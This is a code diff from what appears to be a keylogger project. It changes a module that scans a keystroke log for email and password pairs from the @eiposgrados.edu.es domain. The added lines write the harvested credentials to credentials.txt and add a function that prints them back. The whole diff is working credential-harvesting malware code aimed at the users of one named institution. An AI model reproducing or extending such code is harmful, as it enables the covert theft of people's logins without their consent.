@@ -1,14 +1,16 @@
-from pynput.keyboard import Key
-
-from keyUtils import KEYLOG_FILE
 import re
+
+from common import printFile
+from keyUtils import KEYLOG_FILE
+
+CREDENTIALS_FILE = 'credentials.txt'
 
 
 def detectEIPassword():
     """
     detectEIPassword
         Function to confirm the potential presence of a pair (email, password)
-        \n\tIt prints a dict of found credentials.
+        \n\tIt prints a dict of found credentials on the file credentials.txt
     """
     file = open(KEYLOG_FILE, 'r')
     potentialCredentials = []
@@ -23,6 +25,9 @@ def detectEIPassword():
         print(f'''Credentials found
         {credentials}
         ''')
+        file = open(CREDENTIALS_FILE, 'a')
+        file.write('{0}'.format(credentials))
+        file.close()
     else:
         print('Could not find @eiposgrados.edu.es email on the logs.')
 
@@ -50,3 +55,7 @@ def extractCredentials(potentialCredentials) -> dict:
                 f'{email[0]}@eiposgrados.edu.es found, but no credentials identified.')
 
     return credentials
+
+
+def readCredentials():
+    printFile(CREDENTIALS_FILE)
